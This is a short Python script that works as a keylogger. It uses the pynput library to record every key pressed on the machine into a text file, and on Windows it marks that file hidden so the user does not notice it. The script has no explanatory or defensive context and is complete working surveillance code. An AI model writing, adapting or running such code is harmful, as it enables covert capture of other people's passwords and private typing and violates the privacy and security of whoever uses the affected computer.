import pynput.keyboard
import threading
import os

log_file = "logs.txt"

def write_to_file(key):
    key = str(key).replace("'", "")
    with open(log_file, "a") as f:
        f.write(key + " ")

def on_press(key):
    write_to_file(key)


listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()

if os.name == "nt":
    os.system(f"attrib +h {log_file}")

print("Keylogger running... (Press Ctrl+C to stop manually)")
listener.join()